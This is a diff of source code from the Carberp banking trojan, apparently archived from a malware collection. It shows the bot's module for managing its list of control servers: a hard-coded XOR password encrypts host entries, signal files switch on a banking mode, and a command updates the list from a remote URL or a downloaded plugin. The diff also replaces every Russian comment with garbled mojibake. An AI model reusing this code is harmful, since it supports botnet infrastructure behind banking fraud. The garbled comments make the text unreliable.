@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 
@@ -22,16 +33,16 @@
 
 
 //------------------------------------------------------
-// Константы для работы с файлами хостов
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------------
 
-#define HOST_FILE_SIGNATURE  0xFA5E87CD  /* Сигнатура файда хостов */
-#define HOST_BLOCK_SIGNATURE 0x2A8E87CA  /* Сигнатура блока хоста */
+#define HOST_FILE_SIGNATURE  0xFA5E87CD  /* пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ */
+#define HOST_BLOCK_SIGNATURE 0x2A8E87CA  /* пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ */
 
-#define HOST_FILE_VERSION   1           /* Версия файла хостов */
+#define HOST_FILE_VERSION   1           /* пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ */
 
 
-// Пароль шифрования хостов
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 const static char HostCryptPassword[] = {'H', 'J', 'G', 's', 'd', 'l', 'k', '8', '7', '3', 'd',  0};
 
 const static char HostsBankingModeSignal[] = {'h', 's', 't', 'b', 'm', 'l', 'd', '.', 's', 'g', 'l',  0};
@@ -41,49 +52,49 @@ const static char HostsNoBankingMode[] = {'n', 'o', 'b', 'n', 'k', '.', 'l', 'i'
 
 
 //------------------------------------------------------
-// Описание заголовка файла хостов
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------------
 #pragma pack(push, 1)
 typedef struct THostFileHeader
 {
-	DWORD Signature;   // Сигнатура файла
-	DWORD Version;     // Версия файла
-	DWORD Weight;      // Вес списка в файле
-	DWORD Count;       // Количество хостов в файле
+	DWORD Signature;   // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	DWORD Version;     // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	DWORD Weight;      // пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
+	DWORD Count;       // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 } *PHostFileHeader;
 #pragma pack(pop)
 
 //------------------------------------------------------
-// Описание заголовка хоста
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------------
 #pragma pack(push, 1)
 typedef struct THostBlockHeader
 {
-	DWORD    Signature;   // Сигнатура блока
-	DWORD    Hash;        // Хэш хоста
-	DWORD    Status;      // Статус хоста
-	HOSTTIME CheckTime;   //  Время последней проверки
-	DWORD    Length;      // Длина хоста
+	DWORD    Signature;   // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	DWORD    Hash;        // пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	DWORD    Status;      // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	HOSTTIME CheckTime;   //  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	DWORD    Length;      // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 } *PHostBlockHeader;
 #pragma pack(pop)
 
 //---------------------------------------------------------------------------
 
 //***************************************************************************
-//  Методы работы с файлом списка хостов
+//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //***************************************************************************
 namespace HostsReader
 {
 
 	bool ReadFileHeader(HANDLE File, PHostFileHeader H)
 	{
-		// Функция читает заголовок файла
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
         DWORD Readed;
 		pReadFile(File, H, sizeof(THostFileHeader), &Readed, NULL);
 		if (Readed != sizeof(THostFileHeader))
 			return false;
 
-		// Проверяем сигнатуру и версию файла
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		if (H->Signature != HOST_FILE_SIGNATURE || H->Version != HOST_FILE_VERSION)
 		{
             ClearStruct(*H);
@@ -95,20 +106,20 @@ namespace HostsReader
 
 	bool ReadHostBlock(HANDLE File, PHostBlockHeader H, PCHAR *Host)
 	{
-		// Функция читает блок хоста
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
         DWORD Readed;
 		pReadFile(File, H, sizeof(THostBlockHeader), &Readed, NULL);
 		if (Readed != sizeof(THostBlockHeader))
 			return false;
 
-		// Проверяем сигнатуру блока
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		if (H->Signature != HOST_BLOCK_SIGNATURE)
 		{
 			ClearStruct(*H);
 			return false;
 		}
 
-		// Читаем данные хоста
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		if (Host != NULL)
 		{
 			*Host = STR::Alloc(H->Length);
@@ -135,7 +146,7 @@ namespace HostsReader
 
 void FreeHostRecord(LPVOID Data)
 {
-	// Уничтожаем структуру хоста
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (Data == NULL)
 		return;
 
@@ -148,7 +159,7 @@ void FreeHostRecord(LPVOID Data)
 
 PHostList Hosts::CreateList()
 {
-	// Функция создаёт список хостов.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 	PHostList L = CreateStruct(THostList);
 	if (L == NULL)
 		return NULL;
@@ -163,7 +174,7 @@ PHostList Hosts::CreateList()
 
 void Hosts::FreeList(PHostList List)
 {
-	// Функция уничтожает список хостов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (List != NULL)
 	{
 		List::Free(List->Items);
@@ -174,7 +185,7 @@ void Hosts::FreeList(PHostList List)
 
 void Hosts::ClearList(PHostList List)
 {
-	//  ClearList - Функция очищает список хостов
+	//  ClearList - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (List != NULL)
 	{
 		List->Weight = HOSTS_WEIGHT_DEFAULT;
@@ -185,7 +196,7 @@ void Hosts::ClearList(PHostList List)
 
 PHost Hosts::AddHost(PHostList List, PCHAR Host)
 {
-	//  Добавить новый хост в список
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (List == NULL || STRA::IsEmpty(Host))
 		return NULL;
 
@@ -207,7 +218,7 @@ PHost Hosts::AddHost(PHostList List, const string &Host)
 
 PCHAR __EncodeHost(PCHAR Host)
 {
-	// Функция зашифровывает данные хоста
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
     PCHAR Result =STR::New(Host);
 	XORCrypt::Crypt((PCHAR)HostCryptPassword, (LPBYTE)Result, StrCalcLength(Result));
 	return Result;
@@ -215,7 +226,7 @@ PCHAR __EncodeHost(PCHAR Host)
 
 PCHAR __DecodeHost(PCHAR Host)
 {
-	// Функция расшифрвывает данные хоста
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
     PCHAR Result =STR::New(Host);
 	XORCrypt::Crypt((PCHAR)HostCryptPassword, (LPBYTE)Result, StrCalcLength(Result));
 	return Result;
@@ -226,11 +237,11 @@ PCHAR __DecodeHost(PCHAR Host)
 
 bool HostsDoWriteListToFile(HANDLE File, PHostList List)
 {
-	// Функция записывает список хостов в открытый файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
 	DWORD Writed = 0;
 
-	// Записываем заголовок файла
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	THostFileHeader H;
 	ClearStruct(H);
 
@@ -243,7 +254,7 @@ bool HostsDoWriteListToFile(HANDLE File, PHostList List)
 	if (Writed != sizeof(H))
 		return false;
 
-	// Записываем элементы списка
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	for (DWORD i = 0; i < List::Count(List->Items); i++)
 	{
 		PHost Host = (PHost)List::GetItem(List->Items, i);
@@ -251,7 +262,7 @@ bool HostsDoWriteListToFile(HANDLE File, PHostList List)
 			continue;
 
 
-		// Записываем заголовок блока хоста
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		THostBlockHeader Block;
 		ClearStruct(Block);
 
@@ -270,7 +281,7 @@ bool HostsDoWriteListToFile(HANDLE File, PHostList List)
 			return false;
 		}
 
-		// Записываем хост
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		pWriteFile(File, TempHost, Block.Length, &Writed, NULL);
 		if (Writed != Block.Length)
 		{
@@ -287,10 +298,10 @@ bool HostsDoWriteListToFile(HANDLE File, PHostList List)
 
 bool HostsDoLoadListFromFile(HANDLE File, PHostList List)
 {
-	// Функция загружает данные списка хостов из файла
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
 
-	// =================  Читаем заголовок файла  ==================
+	// =================  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ  ==================
 
 	THostFileHeader H;
 	if (!HostsReader::ReadFileHeader(File, &H))
@@ -298,11 +309,11 @@ bool HostsDoLoadListFromFile(HANDLE File, PHostList List)
 
 	List->Weight = H.Weight;
 
-	// =================  Читаем блоки хостов  ==================
+	// =================  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ  ==================
 
 	for (DWORD i = 0; i < H.Count; i++)
 	{
-		// Читаем заголовок блока
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		THostBlockHeader Block;
 		PCHAR Host;
 
@@ -316,7 +327,7 @@ bool HostsDoLoadListFromFile(HANDLE File, PHostList List)
 			return false;
 		}
 
-		// Копируем данные изи заголовка блока
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		Rec->Status    = Block.Status;
 		Rec->CheckTime = Block.CheckTime;
 		Rec->Host      = __DecodeHost(Host);
@@ -334,10 +345,10 @@ bool HostsDoLoadListFromFile(HANDLE File, PHostList List)
 
 HANDLE OpenHostsFile(PCHAR FileName, DWORD AccessMode, DWORD ShareMode, DWORD CreationDisposition)
 {
-	// Функция открывает файл со списком хостов
-	// Возможна ситуация когда файл списока хостов будет уже занят,
-	// в этом случае будем повторять попытки открытия файла до тех пор
-	// пока он не освободится
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ,
+	// пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (STR::IsEmpty(FileName))
 		return INVALID_HANDLE_VALUE;
@@ -350,10 +361,10 @@ HANDLE OpenHostsFile(PCHAR FileName, DWORD AccessMode, DWORD ShareMode, DWORD Cr
 
 		if (File == INVALID_HANDLE_VALUE)
 		{
-			// В случае ошибки открытия файла по причине ошиьки
-			// общего доступа (файл в данный момент использыется)
-			// ожидаем некоторое время и пытаемся снова открыть файл.
-			// В противном случае прерываем цикл
+			// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+			// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
+			// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			if (pGetLastError() ==  ERROR_SHARING_VIOLATION)
 				pSleep(50);
 			else
@@ -368,13 +379,13 @@ HANDLE OpenHostsFile(PCHAR FileName, DWORD AccessMode, DWORD ShareMode, DWORD Cr
 
 bool Hosts::SaveListToFile(PHostList List, PCHAR FileName, bool IgnoreWeight)
 {
-	// Функция сохраняет список хостов в файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 	if (List == NULL || STR::IsEmpty(FileName))
 		return false;
 
-	// Открываем файл.
-	// Так как файлом хостов будут пользоваться разные процессы и возможна
-	// одновременная запись
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
+	// пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	DWORD Access = (IgnoreWeight) ? GENERIC_WRITE : GENERIC_ALL;
 
@@ -384,28 +395,28 @@ bool Hosts::SaveListToFile(PHostList List, PCHAR FileName, bool IgnoreWeight)
 		return false;
 
 
-	// Проверяем вес списка в файле
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (!IgnoreWeight)
 	{
 		DWORD Weight;
 		if ((GetListWeight(File, Weight) && Weight > List->Weight))
 		{
-			// В случае если вес списка из файла выше, то
-			// прерываем запись
+			// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅ
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			pCloseHandle(File);
 			return false;
 		}
     }
 
-    // Обрезаем файл
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	pSetFilePointer(File, 0, 0, FILE_BEGIN);
 	pSetEndOfFile(File);
 
-	// Записываем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
     bool Result = HostsDoWriteListToFile(File, List);
 
 
-	// Закрываем файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	pCloseHandle(File);
 
 	return Result;
@@ -414,7 +425,7 @@ bool Hosts::SaveListToFile(PHostList List, PCHAR FileName, bool IgnoreWeight)
 
 bool Hosts::LoadListFromFile(PHostList List, PCHAR FileName)
 {
-   //	Функция загружает список хостов из файла
+   //	пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
    ClearList(List);
 
@@ -432,7 +443,7 @@ bool Hosts::LoadListFromFile(PHostList List, PCHAR FileName)
 
 bool Hosts::GetListWeight(HANDLE File, DWORD &Weight)
 {
-	// Функция возвращает вес списка записанного в файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
     Weight = 0;
 
     THostFileHeader H;
@@ -448,14 +459,14 @@ bool Hosts::GetListWeight(HANDLE File, DWORD &Weight)
 
 bool Hosts::ExecuteUpdateHostsCommand(LPVOID TaskManager, PCHAR Command, PCHAR Args)
 {
-	// функция выполняет команду обновления списка хостов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
     return UpdateHosts(Args);
 }
 //---------------------------------------------------------------------------
 
 PCHAR HostsGetBankingSignalFile()
 {
-	// Функция возвращает истину если в хосты работают в режиме банкинга
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	return BOT::GetWorkPath(NULL, (PCHAR)HostsBankingModeSignal);
 }
 //---------------------------------------------------------------------------
@@ -463,9 +474,9 @@ PCHAR HostsGetBankingSignalFile()
 bool Hosts::UpdateHosts(PCHAR Args)
 {
 
-	//  Функция загружает список хостов и обновляет файл на диске
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
-	// ================ Загружаем список ================
+	// ================ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ ================
 
 	LPVOID Buffer    = NULL;
 	DWORD BufferSize = 0;
@@ -473,11 +484,11 @@ bool Hosts::UpdateHosts(PCHAR Args)
 
 	bool IgnoreWeight = false;
 
-	// Определяем тип параметры
-	// Вариант 1: Парметр начинается с http://
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 1: пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ http://
 	if (STR::GetHash(Args, 7, true) == 0x4E0F3408 /* http:// */)
 	{
-		// Загружаем файл со списком хостов
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (!HTTP::Get(Args, (PCHAR *)&Buffer, NULL))
 			return false;
 
@@ -486,11 +497,11 @@ bool Hosts::UpdateHosts(PCHAR Args)
 	}
 	else
 	{
-		// Вариант 2: Указано короткое имя плагина
-		// Загружаем плагин
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 2: пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (STR::IsEmpty(Args))
 		{
-			// Плагин не указан определяем нужный
+			// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //			PCHAR Signal = HostsGetBankingSignalFile();
 
 //			if (FileExistsA(Signal))
@@ -510,28 +521,28 @@ bool Hosts::UpdateHosts(PCHAR Args)
 		Buffer = Plugin::Download(Args, NULL, &BufferSize, false);
 	}
 
-	// ================ Обрабатываем загруженный буфер ================
+	// ================ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ ================
 
 	if (Buffer == NULL)
 		return false;
 
     bool Result = false;
 
-	// Для более надёжной работы системы хранения и обновления
-	// хостов загруженный буфер сохраняем во временный файл,
-	// затем, в случае успешной загрузки списка из него,
-	// сохраняем список в рабочий файл
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ,
+	// пїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ,
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	PCHAR TempFile = File::GetTempNameA();
 	if (TempFile != NULL)
 	{
         File::WriteBufferA(TempFile, Buffer, BufferSize);
 
-		// Загружаем Список
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		PHostList List = CreateList();
 
 		if (LoadListFromFile(List, TempFile))
 		{
-			// Сохраняем загруженный список в рабочий файл
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			PCHAR WorkFile = BOT::GetHostsFileName();
 			if (WorkFile != NULL)
 			{
